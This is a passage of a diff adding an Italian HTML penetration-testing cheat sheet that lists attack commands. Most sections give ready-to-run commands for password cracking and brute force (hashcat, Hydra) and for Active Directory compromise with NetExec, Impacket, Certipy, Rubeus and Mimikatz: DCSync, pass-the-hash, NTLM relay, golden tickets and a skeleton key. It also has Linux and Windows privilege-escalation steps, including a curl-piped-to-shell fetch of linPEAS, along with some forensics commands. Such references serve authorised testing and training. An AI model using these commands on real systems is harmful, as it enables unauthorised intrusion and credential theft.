+hashcat -m 0 -a 0 hash.txt rockyou.txt
+hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule
+hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?d?d
+hashcat -m 3200 -a 0 bcrypt.txt rockyou.txt
+hashcat -m 16500 -a 0 jwt.txt rockyou.txt
+hashcat -m 18200 -a 0 asrep.hash rockyou.txt
+hashcat -m 13100 -a 0 tgs.hash rockyou.txt
+
+# Mostra cracked
+hashcat -m &lt;mode&gt; hash.txt --show
+
+# Continua sessione
+hashcat --restore
+
+# Benchmark
+hashcat -b</pre>
+
+  <h3>Hydra - Online attacks</h3>
+  <pre># SSH
+hydra -l user -P passwords.txt ssh://target
+hydra -L users.txt -P passwords.txt ssh://target
+
+# FTP
+hydra -l user -P passwords.txt ftp://target
+
+# HTTP POST form
+hydra -l user -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
+
+# HTTP Basic
+hydra -l user -P passwords.txt target http-get /admin
+
+# RDP
+hydra -l user -P passwords.txt rdp://target
+
+# SMB
+hydra -l user -P passwords.txt smb://target
+
+# MySQL
+hydra -l root -P passwords.txt mysql://target
+
+# Con rate limit
+hydra -l user -P passwords.txt ssh://target -t 4 -W 10
+
+# Continue on success
+hydra -L users.txt -p 'Password!' ssh://target -t 4 -f</pre>
+
+  <h3>NetExec (nxc) - AD</h3>
+  <pre># SMB
+nxc smb target -u user -p pass
+nxc smb target -u user -p pass --shares
+nxc smb target -u user -p pass --sam
+nxc smb target -u user -p pass --lsa
+nxc smb target -u admin -p pass --ntds
+nxc smb target -u user -p pass --users
+nxc smb target -u user -p pass --groups
+nxc smb target -u user -p pass --pass-pol
+nxc smb target -u user -p pass --rid-brute
+
+# Password spraying
+nxc smb targets.txt -u users.txt -p 'Password!' --continue-on-success
+
+# Pass-the-Hash
+nxc smb target -u admin -H &lt;NTLM_hash&gt;
+
+# LDAP
+nxc ldap target -u user -p pass --users
+nxc ldap target -u user -p pass --groups
+nxc ldap target -u user -p pass --kerberoasting kerb.hash
+nxc ldap target -u user -p pass --asreproast asrep.hash
+
+# WinRM
+nxc winrm target -u user -p pass
+nxc winrm target -u user -p pass -x "whoami"
+
+# MSSQL
+nxc mssql target -u user -p pass
+nxc mssql target -u user -p pass -q "SELECT @@version"
+
+# Esecuzione comandi
+nxc smb target -u admin -p pass -x "whoami"
+nxc smb target -u admin -p pass -X "powershell -c whoami"</pre>
+
+  <h3>Impacket - Script principali</h3>
+  <pre># AS-REP roasting
+GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
+
+# Kerberoasting
+GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash
+
+# DCSync
+secretsdump.py dominio.corp/da:pass@DC -just-dc
+
+# Dump SAM locale
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+
+# Esecuzione remota
+psexec.py dominio.corp/user:pass@target
+wmiexec.py dominio.corp/user:pass@target
+smbexec.py dominio.corp/user:pass@target
+atexec.py dominio.corp/user:pass@target "whoami"
+
+# Pass-the-Hash
+psexec.py -hashes :&lt;NTLM_hash&gt; dominio.corp/admin@target
+
+# Ticket Kerberos
+ticketer.py -nthash &lt;krbtgt_hash&gt; -domain-sid &lt;SID&gt; -domain dominio.corp administrator
+
+# Add computer
+addcomputer.py -computer-name 'pwn$' -computer-pass 'Pwn3d!' dominio.corp/user:pass
+
+# RBCD
+rbcd.py -delegate-from 'pwn$' -delegate-to 'target$' -action write dominio.corp/user:pass
+
+# S4U
+getST.py -spn cifs/target.dominio.corp -impersonate Administrator dominio.corp/pwn$:Pwn3d!
+
+# NTLM relay
+ntlmrelayx.py -tf targets.txt -smb2support -socks</pre>
+
+  <h3>BloodHound - Collection</h3>
+  <pre># Da Linux
+bloodhound-python -u user -p pass -d dominio.corp -ns &lt;DC_IP&gt; -c All
+
+# Da Windows
+.\SharpHound.exe -c All
+
+# Collection specifiche
+.\SharpHound.exe -c Group,LocalAdmin,Session,Trusts,ACL
+
+# Import in BloodHound CE
+# 1. Avvia BloodHound CE
+# 2. Upload zip/json file
+# 3. Query pre-built o custom Cypher
+
+# Query Cypher utili
+MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMINIO.CORP"}) RETURN u.name
+MATCH (u:User {hasspn:true}) RETURN u.name
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+MATCH (u:User)-[:GenericAll|WriteOwner|WriteDacl*1..]->(da:User) WHERE da.admincount = true RETURN u.name, da.name</pre>
+
+  <h3>Certipy - ADCS</h3>
+  <pre># Find vulnerable templates
+certipy find -u user@dominio.corp -p pass -dc-ip &lt;DC&gt; -vulnerable -enabled
+
+# ESC1 exploitation
+certipy req -u user@dominio.corp -p pass -ca 'CA-NAME' -template VulnTemplate -upn administrator@dominio.corp
+
+# Authentication with cert
+certipy auth -pfx administrator.pfx -dc-ip &lt;DC&gt;
+
+# ESC8 (relay)
+certipy relay -ca &lt;CA_IP&gt; -template DomainController
+
+# ESC4 (modify template)
+certipy template -u user@dominio.corp -p pass -template VulnTemplate -save-old
+
+# Shadow credentials
+certipy shadow auto -u user@dominio.corp -p pass -account target
+
+# Account takeover
+certipy account update -u user@dominio.corp -p pass -user target -upn administrator</pre>
+
+  <h3>Rubeus - Windows Kerberos</h3>
+  <pre># Kerberoasting
+Rubeus.exe kerberoast /outfile:tgs.hash
+
+# AS-REP roasting
+Rubeus.exe asreproast /outfile:asrep.hash
+
+# Pass-the-Ticket
+Rubeus.exe ptt /ticket:&lt;base64_ticket&gt;
+
+# Dump ticket
+Rubeus.exe dump /nowrap
+
+# TGT delegation
+Rubeus.exe tgtdeleg /nowrap
+
+# S4U
+Rubeus.exe s4u /user:target /rc4:&lt;hash&gt; /impersonateuser:administrator /msdsspn:cifs/target.dominio.corp
+
+# Monitor
+Rubeus.exe monitor /interval:5
+
+# Harvest
+Rubeus.exe harvest /interval:30</pre>
+
+  <h3>Mimikatz - Windows credentials</h3>
+  <pre># Esegui come admin
+mimikatz.exe
+
+# Privilege debug
+privilege::debug
+
+# Estrai password in chiaro
+sekurlsa::logonpasswords
+
+# Estrai ticket Kerberos
+sekurlsa::tickets /export
+
+# Pass-the-Hash
+sekurlsa::pth /user:administrator /domain:dominio.corp /ntlm:&lt;hash&gt;
+
+# DCSync
+lsadump::dcsync /domain:dominio.corp /user:administrator
+lsadump::dcsync /domain:dominio.corp /user:krbtgt
+
+# Dump SAM
+lsadump::sam
+
+# Golden Ticket
+kerberos::golden /user:administrator /domain:dominio.corp /sid:&lt;SID&gt; /krbtgt:&lt;hash&gt; /ptt
+
+# Silver Ticket
+kerberos::golden /user:administrator /domain:dominio.corp /sid:&lt;SID&gt; /target:target.dominio.corp /service:cifs /rc4:&lt;hash&gt; /ptt
+
+# Lista ticket in memoria
+kerberos::list
+
+# PTT
+kerberos::ptt ticket.kirbi
+
+# Skeleton Key
+misc::skeleton</pre>
+
+  <h3>Wireshark / tshark - Network</h3>
+  <pre># Filtri display utili
+ip.addr == 10.0.0.5
+tcp.port == 443
+http.request.method == "POST"
+dns.qry.name contains "evil"
+tls.handshake.type == 1
+kerberos.msg_type == 10
+smb2.cmd == 5
+
+# tshark estrattore
+tshark -r traffic.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
+
+# Export oggetti HTTP
+# Wireshark: File -> Export Objects -> HTTP
+
+# Statistiche
+tshark -r traffic.pcap -q -z io,phs
+tshark -r traffic.pcap -q -z conv,tcp</pre>
+
+  <h3>Volatility 3 - Memory</h3>
+  <pre># Info dump
+vol -f memory.raw windows.info
+
+# Processi
+vol -f memory.raw windows.pslist
+vol -f memory.raw windows.psscan
+vol -f memory.raw windows.pstree
+vol -f memory.raw windows.cmdline
+
+# Rete
+vol -f memory.raw windows.netscan
+
+# Code injection
+vol -f memory.raw windows.malfind
+
+# Credenziali
+vol -f memory.raw windows.hashdump
+vol -f memory.raw windows.lsadump
+vol -f memory.raw windows.cachedump
+
+# Registry
+vol -f memory.raw windows.registry.hivelist
+vol -f memory.raw windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Rootkit
+vol -f memory.raw windows.callbacks
+vol -f memory.raw windows.ssdt
+vol -f memory.raw windows.driverscan</pre>
+
+  <h3>Linux PrivEsc - Comandi rapidi</h3>
+  <pre># Identita
+id
+whoami
+uname -a
+cat /etc/os-release
+
+# Sudo
+sudo -l
+
+# SUID
+find / -perm -u=s -type f 2>/dev/null
+
+# Capabilities
+getcap -r / 2>/dev/null
+
+# Cron
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# File scrivibili
+find / -writable -type d 2>/dev/null | grep -v proc
+find / -perm -o+w -type f 2>/dev/null | grep -E "(passwd|shadow|sudoers|crontab)"
+
+# Servizi locali
+ss -tlnp
+netstat -tlnp
+
+# History
+cat ~/.bash_history
+cat /root/.bash_history 2>/dev/null
+
+# Credenziali in file
+grep -rE "password|pwd|passwd" /etc /var/www 2>/dev/null | head -50
+
+# Kernel exploit
+searchsploit "linux kernel 5.4"
+./les.sh
+
+# linPEAS
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>
+
+  <h3>Windows PrivEsc - Comandi rapidi</h3>
+  <pre># Identita
+whoami
+whoami /priv
+whoami /groups
+whoami /all
+
+# Sistema
+systeminfo
+wmic qfe get HotFixID,InstalledOn
+
+# Servizi
+sc query
+sc qc &lt;service&gt;
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+Get-ScheduledTask
+
+# Software installato
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
+
+# Credenziali registry
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+# Unattend files
+dir /s /b c:\unattend.xml
+type c:\Windows\Panther\Unattend\Unattend.xml
+
+# AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Stored credentials
+cmdkey /list
+
+# winPEAS
+winpeasx64.exe
+winpeas.bat
+
+# PowerUp
+Set-ExecutionPolicy Bypass -Scope Process
+. .\PowerUp.ps1
+Invoke-AllChecks</pre>
+
+  <h3>Steganografia - Comandi</h3>
+  <pre># Analisi base
+file immagine.png
+exiftool immagine.png
+binwalk immagine.png
+strings immagine.png | less
+
+# LSB (PNG/BMP)
+zsteg immagine.png
+zsteg -a immagine.png
+
+# JPEG
+steghide info immagine.jpg
+steghide extract -sf immagine.jpg -p "password"
+stegseek immagine.jpg rockyou.txt
+
+# Estrazione file appesi
+binwalk -e immagine.png
+foremost -t jpg -i disk.img -o recovered/
+
+# Audio
+# Audacity -> View -> Spectrogram
+
+# Aperi'Solve (web)
+# https://aperisolve.com</pre>
+
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+</body>
+</html>
